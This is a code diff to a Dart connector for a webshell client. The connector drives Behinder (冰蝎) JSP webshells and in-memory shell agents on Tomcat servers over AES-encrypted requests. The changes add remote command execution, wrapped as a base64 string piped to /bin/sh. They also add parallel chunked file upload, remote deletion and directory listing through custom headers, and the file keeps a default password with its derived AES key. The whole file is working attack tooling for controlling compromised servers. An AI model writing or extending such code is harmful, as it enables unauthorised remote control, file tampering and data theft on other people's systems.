@@ -17,6 +17,8 @@ import 'shell_connector.dart';
 
 /// `jsp_behinder.jsp` / `bing.jsp`：冰蝎 3.0 协议，AES 加密传输
 ///
+/// 大文件上传加速（Session 分块 `wpart`）设计说明见 [docs/jsp_upload_behinder_analysis.md](docs/jsp_upload_behinder_analysis.md)。
+///
 /// 密钥 = MD5(连接密码)[0:16]，默认密码 mAtrix_911 → 42b842fc69195c9d
 /// POST body 两行：第 1 行 base64(AES_encrypt(M.class))，第 2 行 a=exec&_k=xxx&xxx=cmd
 /// bing.jsp 兼容：payload 只读第一行，agent 用 getReader().readLine() 读第二行解析参数
@@ -123,8 +125,14 @@ class JspBehinderConnector extends ShellConnector {
         h['X-K'] = e.value;
       } else if (e.key == 'path') {
         h['X-Path'] = e.value;
+      } else if (e.key == 'path_b64') {
+        h['X-Path-B64'] = e.value;
       } else if (e.key == 'data') {
         h['X-Data'] = e.value;
+      } else if (e.key == 'blk') {
+        h['X-Blk'] = e.value;
+      } else if (e.key == 'bsz') {
+        h['X-Bsz'] = e.value;
       } else if (e.key.length == 32 && _isHex32(e.key)) {
         h['X-V'] = e.value;
       }
@@ -225,8 +233,19 @@ class JspBehinderConnector extends ShellConnector {
       final r = await _sendBehinder(
         'ping',
       ).timeout(const Duration(seconds: 15));
-      _lastPingDiagnostic = r.contains('MATRIX_JSP_PING') ? null : r;
-      return r.contains('MATRIX_JSP_PING');
+      if (r.contains('MATRIX_JSP_PING')) {
+        _lastPingDiagnostic = null;
+        return true;
+      }
+      if (r.trim().isEmpty) {
+        _lastPingDiagnostic =
+            'HTTP 200 但响应体为空。请核对：① 内存马 JSP 内 AES 密钥与 Matrix「密码」是否一致；'
+            '② 是否已 flutter clean 完整重建（jsp_agent_M.b64 需进包）；③ 目标是否拦截 application/octet-stream POST；'
+            '④ Tomcat 10+/Jakarta 需使用已更新的 agent（纯反射、无 javax 强转）。';
+      } else {
+        _lastPingDiagnostic = r;
+      }
+      return false;
     } catch (e) {
       _lastPingDiagnostic = e.toString();
       return false;
@@ -236,6 +255,36 @@ class JspBehinderConnector extends ShellConnector {
   static String _sq(String s) => "'${s.replaceAll("'", "'\\''")}'";
 
   static bool _hasNonAscii(String s) => s.codeUnits.any((c) => c > 127);
+
+  /// Tomcat 等整请求头约 8KB；路径 Base64 过长则无法安全放进头里，需回退 exec。
+  static const _kMaxPathB64HeaderChars = 6000;
+
+  /// 纯 ASCII 且较短用 [X-Path]；含非 ASCII 用 [X-Path-B64]（UTF-8 再 Base64）。
+  /// 返回 null 表示应走 shell/exec。
+  static Map<String, String>? _pathHeadersForNative(String path) {
+    if (_hasNonAscii(path)) {
+      final b64 = base64.encode(utf8.encode(path));
+      if (b64.length > _kMaxPathB64HeaderChars) return null;
+      return {'path_b64': b64};
+    }
+    if (path.length > 2048) return null;
+    return {'path': path};
+  }
+
+  static int _pathHeaderCharBudget(String path) {
+    final m = _pathHeadersForNative(path);
+    if (m == null) return 99999;
+    if (m.containsKey('path_b64')) return m['path_b64']!.length;
+    return m['path']!.length;
+  }
+
+  /// 冰蝎 exec 把脚本放在 [X-V]；Dart [http] 要求头值为合法字段，**不能含非 ASCII**。
+  /// 含中文等时整段脚本 UTF-8→Base64，经 shell 解码后交给 `/bin/sh`（与上传 exec 回退一致）。
+  static String _execScriptForXvHeader(String script) {
+    if (!_hasNonAscii(script)) return script;
+    final b64 = base64.encode(utf8.encode(script));
+    return 'echo ${_sq(b64)}|base64 -d|/bin/sh';
+  }
 
   @override
   Future<String> executeCommand(String cmd, {String workingDir = ''}) async {
@@ -250,9 +299,11 @@ class JspBehinderConnector extends ShellConnector {
     } else {
       cd = '';
     }
+    final script = '$cd$cmd';
+    final xv = _execScriptForXvHeader(script);
     final r = await _sendBehinder(
       'exec',
-      extraParams: {'_k': _execKey, _execKey: '$cd$cmd'},
+      extraParams: {'_k': _execKey, _execKey: xv},
     );
     return r.trim();
   }
@@ -319,13 +370,14 @@ class JspBehinderConnector extends ShellConnector {
   @override
   Future<List<FileEntry>> listDirectory(String path) async {
     final String result;
-    if (_hasNonAscii(path)) {
+    final ph = _pathHeadersForNative(path);
+    if (ph != null) {
+      result = await _sendBehinder('ls', extraParams: ph);
+    } else {
       result = await _sendBehinder(
         'exec',
         extraParams: {'_k': _execKey, _execKey: _execLsCmd(path)},
       );
-    } else {
-      result = await _sendBehinder('ls', extraParams: {'path': path});
     }
     if (result.isEmpty ||
         result.startsWith('ERR_OPEN') ||
@@ -354,8 +406,13 @@ class JspBehinderConnector extends ShellConnector {
 
   @override
   Future<bool> deleteFile(String path) async {
-    // base64-encode the path so non-ASCII names (e.g. Chinese) are safe in the
-    // HTTP header value sent to the behinder agent.
+    final ph = _pathHeadersForNative(path);
+    if (ph != null) {
+      try {
+        final r = await _sendBehinder('rm', extraParams: ph);
+        if (r.trim() == '1') return true;
+      } catch (_) {}
+    }
     final b64Path = base64.encode(utf8.encode(path));
     final cmd =
         "_p=\$(echo ${_sq(b64Path)} | base64 -d) && rm \"\$_p\" && echo 1 || echo 0";
@@ -398,8 +455,96 @@ class JspBehinderConnector extends ShellConnector {
     return writeFileBinaryWithProgress(path, bytes, (_, _) {});
   }
 
-  // 分块大小：3 KB → base64 约 4 KB，确保 X-V header 不超 Tomcat maxHttpHeaderSize (8 KB)
+  /// exec 回退路径：小块，保证 X-V 不超 Tomcat 头限制
   static const _kChunkSize = 4 * 1024;
+
+  /// 与 Behinder 类似：Session + FileChannel 并行分块（见 docs/jsp_upload_behinder_analysis.md）
+  static const _kWpartParallelism = 8;
+
+  static const _kNativeWriteHeaderBudget = 7200;
+
+  int _maxNativeWriteB64Chars(String path) {
+    const fixedOverhead = 480;
+    return (_kNativeWriteHeaderBudget -
+            _pathHeaderCharBudget(path) -
+            fixedOverhead)
+        .clamp(1200, 6200);
+  }
+
+  Future<void> _wcloseRemoteFile(String target) async {
+    final ph = _pathHeadersForNative(target);
+    if (ph == null) return;
+    try {
+      await _sendBehinder('wclose', extraParams: ph);
+    } catch (_) {}
+  }
+
+  Future<bool> _uploadWpartBlock(
+    String path,
+    Uint8List full,
+    int blockIndex,
+    int blockSize,
+  ) async {
+    final start = blockIndex * blockSize;
+    if (start >= full.length) return true;
+    final end = math.min(start + blockSize, full.length);
+    final chunk = full.sublist(start, end);
+    final ph = _pathHeadersForNative(path);
+    if (ph == null) return false;
+    final r = await _sendBehinder(
+      'wpart',
+      extraParams: {
+        ...ph,
+        'data': base64.encode(chunk),
+        'blk': '$blockIndex',
+        'bsz': '$blockSize',
+      },
+    );
+    return r.trim() == '1';
+  }
+
+  /// 失败返回 false，由调用方回退 exec
+  Future<bool> _writeFileBinaryWpart(
+    String target,
+    Uint8List bytes,
+    void Function(int sent, int total) onProgress,
+  ) async {
+    final total = bytes.length;
+    final maxB64 = (_maxNativeWriteB64Chars(target) - 96).clamp(600, 6200);
+    var blockSize = (maxB64 * 3 ~/ 4) - 24;
+    blockSize = blockSize.clamp(512, 4096);
+    final blockCount = (total + blockSize - 1) ~/ blockSize;
+
+    await _sendBehinder('ping');
+
+    if (blockCount > 0) {
+      if (!await _uploadWpartBlock(target, bytes, 0, blockSize)) {
+        await _wcloseRemoteFile(target);
+        return false;
+      }
+      onProgress(math.min(blockSize, total), total);
+    }
+
+    for (var batchStart = 1;
+        batchStart < blockCount;
+        batchStart += _kWpartParallelism) {
+      final batchEnd = math.min(batchStart + _kWpartParallelism, blockCount);
+      final futures = <Future<bool>>[];
+      for (var bi = batchStart; bi < batchEnd; bi++) {
+        futures.add(_uploadWpartBlock(target, bytes, bi, blockSize));
+      }
+      final results = await Future.wait(futures);
+      if (results.any((ok) => !ok)) {
+        await _wcloseRemoteFile(target);
+        return false;
+      }
+      final sent = math.min(batchEnd * blockSize, total);
+      onProgress(sent, total);
+    }
+    await _wcloseRemoteFile(target);
+    onProgress(total, total);
+    return true;
+  }
 
   @override
   Future<bool> writeFileBinaryWithProgress(
@@ -411,12 +556,18 @@ class JspBehinderConnector extends ShellConnector {
     final target = _uploadPathFor(path);
     onProgress(0, total);
 
-    // Base64-encode the target path so the shell command stays pure ASCII —
-    // non-ASCII file names (e.g. Chinese) would otherwise be rejected by
-    // Dart's HTTP client as an invalid header field value.
+    // exec 回退：路径经 shell base64 解码（与原生头的 X-Path-B64 无关）。
     final b64Target = base64.encode(utf8.encode(target));
 
+    final pathHdr = _pathHeadersForNative(target);
     if (total == 0) {
+      if (pathHdr != null) {
+        final r = await _sendBehinder(
+          'write',
+          extraParams: {...pathHdr, 'data': ''},
+        );
+        if (r.trim() == '1') return true;
+      }
       final cmd =
           "_p=\$(echo ${_sq(b64Target)} | base64 -d) && : > \"\$_p\" && echo 1 || echo 0";
       final r = await _sendBehinder(
@@ -424,6 +575,25 @@ class JspBehinderConnector extends ShellConnector {
         extraParams: {'_k': _execKey, _execKey: cmd},
       );
       return r.trim().endsWith('1');
+    }
+
+    if (pathHdr != null) {
+      final dataB64 = base64.encode(bytes);
+      if (dataB64.length <= _maxNativeWriteB64Chars(target)) {
+        final r = await _sendBehinder(
+          'write',
+          extraParams: {...pathHdr, 'data': dataB64},
+        );
+        if (r.trim() == '1') {
+          onProgress(total, total);
+          return true;
+        }
+      }
+    }
+
+    if (pathHdr != null) {
+      final ok = await _writeFileBinaryWpart(target, bytes, onProgress);
+      if (ok) return true;
     }
 
     int offset = 0;
@@ -481,13 +651,14 @@ class JspBehinderConnector extends ShellConnector {
     String path,
   ) async {
     final String result;
-    if (_hasNonAscii(path)) {
+    final ph = _pathHeadersForNative(path);
+    if (ph != null) {
+      result = await _sendBehinder('ls', extraParams: ph);
+    } else {
       result = await _sendBehinder(
         'exec',
         extraParams: {'_k': _execKey, _execKey: _execLsCmd(path)},
       );
-    } else {
-      result = await _sendBehinder('ls', extraParams: {'path': path});
     }
     if (result.isEmpty || result.startsWith('[')) return [];
     final out = <({String name, bool isDir})>[];
